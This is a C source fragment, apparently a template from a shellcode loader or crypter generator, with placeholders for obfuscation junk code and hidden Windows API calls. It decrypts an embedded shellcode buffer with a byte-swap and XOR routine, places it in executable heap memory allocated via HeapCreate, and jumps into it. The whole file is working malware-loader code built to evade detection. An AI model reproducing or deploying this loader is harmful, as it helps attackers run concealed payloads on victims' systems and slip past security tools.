static forceinline void _obf_decrypt_shellcode(char *shell, char *key, int size) {
    {{obf:*}}
    for (int i = 0; i < size; i += 8) {
        char b;
        // Swap (mirroring 8 bytes) and xor decryption
        {{obf:*}} b = shell[i+0]; {{obf:*}} shell[i+0] = key[i+0] ^ shell[i+7]; {{obf:*}} shell[i+7] = key[i+7] ^ b;
        {{obf:*}} b = shell[i+1]; {{obf:*}} shell[i+1] = key[i+1] ^ shell[i+6]; {{obf:*}} shell[i+6] = key[i+6] ^ b;
        {{obf:*}} b = shell[i+2]; {{obf:*}} shell[i+2] = key[i+2] ^ shell[i+5]; {{obf:*}} shell[i+5] = key[i+5] ^ b;
        {{obf:*}} b = shell[i+3]; {{obf:*}} shell[i+3] = key[i+3] ^ shell[i+4]; {{obf:*}} shell[i+4] = key[i+4] ^ b;
        {{obf:*}}
    }
    {{obf:*}}
}

static forceinline void _obf_execute_shellcode(_obf_api_caller_t caller) {
    {{obf:*}} HANDLE h = {{api-n:HeapCreate}}((PVOID)HEAP_CREATE_ENABLE_EXECUTE, _obf_shellcode_size, _obf_shellcode_size);
    {{obf:*}} char *buf = {{api-n:HeapAlloc}}((PVOID)h, HEAP_ZERO_MEMORY, _obf_shellcode_size);
    {{obf:*}} memcpy(buf, _obf_shellcode, _obf_shellcode_size);
    {{obf:*}} _obf_decrypt_shellcode(buf, _obf_shellcode_key, _obf_shellcode_size);

    // printf("Hello Shell!\n");
    
    {{obf:*}} (*(void(*)())buf)();
    {{obf:*}}
}